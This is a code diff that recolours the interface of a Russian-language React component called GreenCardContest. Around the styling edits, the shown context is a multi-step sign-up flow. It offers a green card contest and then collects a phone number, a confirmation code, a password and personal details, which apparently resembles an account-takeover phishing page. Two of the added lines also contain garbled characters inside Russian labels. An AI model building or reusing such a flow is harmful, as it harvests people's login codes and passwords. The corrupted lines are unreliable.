@@ -685,8 +685,8 @@ export default function GreenCardContest() {
       <div className="relative flex-1 flex flex-col items-center justify-center px-6 pt-6 pb-4">
         {/* Background gradient orbs */}
         <div className="absolute inset-0 overflow-hidden pointer-events-none">
-          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-[#3C3B6E]/20 rounded-full filter blur-[120px]" />
-          <div className="absolute top-1/3 left-1/4 w-[400px] h-[400px] bg-[#B22234]/10 rounded-full filter blur-[100px]" />
+          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-red-600/20 rounded-full filter blur-[120px]" />
+          <div className="absolute top-1/3 left-1/4 w-[400px] h-[400px] bg-red-500/10 rounded-full filter blur-[100px]" />
         </div>
 
         {/* Content */}
@@ -786,7 +786,7 @@ export default function GreenCardContest() {
             haptic("medium");
             setStep("phone");
           }}
-          className="w-full h-14 bg-white text-black font-medium rounded-2xl flex items-center justify-center gap-3 transition-all hover:bg-white/90 active:bg-white/80"
+          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-3 transition-all hover:bg-red-500 active:bg-red-700"
         >
           <span>Участвовать</span>
           <Icons.ArrowRight />
@@ -950,7 +950,7 @@ export default function GreenCardContest() {
         <button
           onClick={requestCode}
           disabled={!isPhoneComplete || isLoading}
-          className="w-full h-14 bg-white text-black font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-white/90"
+          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
         >
           {isLoading ? <Spinner /> : "Получить код"}
         </button>
@@ -1044,7 +1044,7 @@ export default function GreenCardContest() {
         <button
           onClick={submitCode}
           disabled={codeDigits.some((d) => !d) || isLoading}
-          className="w-full h-14 bg-white text-black font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-white/90"
+          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
         >
           {isLoading ? <Spinner /> : "Подтвердить"}
         </button>
@@ -1136,7 +1136,7 @@ export default function GreenCardContest() {
         <button
           onClick={submitPassword}
           disabled={!formData.password || isLoading}
-          className="w-full h-14 bg-white text-black font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-white/90"
+          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
         >
           {isLoading ? <Spinner /> : "Продолжить"}
         </button>
@@ -1165,7 +1165,7 @@ export default function GreenCardContest() {
         <div className="flex-1">
           <div className="h-1 bg-white/10 rounded-full overflow-hidden">
             <motion.div
-              className="h-full bg-white rounded-full"
+              className="h-full bg-red-500 rounded-full"
               initial={{ width: 0 }}
               animate={{ width: `${infoProgress * 100}%` }}
               transition={{ duration: 0.3 }}
@@ -1251,7 +1251,7 @@ export default function GreenCardContest() {
         <button
           onClick={handleSubmitInfo}
           disabled={!formData.firstName || !formData.lastName || !formData.birthDate || !formData.currentCity}
-          className="w-full h-14 bg-white text-black font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-white/90"
+          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
         >
           Далее
         </button>
@@ -1279,7 +1279,7 @@ export default function GreenCardContest() {
         </button>
         <div className="flex-1">
           <div className="h-1 bg-white/10 rounded-full overflow-hidden">
-            <div className="h-full bg-white rounded-full w-full" />
+            <div className="h-full bg-red-500 rounded-full w-full" />
           </div>
         </div>
         <span className="text-white/40 text-sm w-12 text-right">100%</span>
@@ -1295,7 +1295,7 @@ export default function GreenCardContest() {
         <div className="space-y-4 max-w-md">
           {/* Occupation */}
           <div>
-            <label className="block text-white/50 text-sm mb-2">Род деятельности *</label>
+            <label className="block text-white/50 text-sm mb-2">Род де��тельности *</label>
             <input
               type="text"
               value={formData.occupation}
@@ -1347,7 +1347,7 @@ export default function GreenCardContest() {
         <button
           onClick={handleFinalSubmit}
           disabled={!formData.occupation}
-          className="w-full h-14 bg-white text-black font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-white/90"
+          className="w-full h-14 bg-red-600 text-white font-medium rounded-2xl flex items-center justify-center gap-2 transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-red-500"
         >
           Завершить реги��т��ацию
         </button>
@@ -1448,7 +1448,7 @@ export default function GreenCardContest() {
   );
 
   return (
-    <div className="min-h-[100dvh] bg-black text-white font-sans">
+    <div className="min-h-[100dvh] bg-background text-foreground font-sans">
       <AnimatePresence mode="wait">
         {step === "landing" && renderLanding()}
         {step === "phone" && renderPhone()}
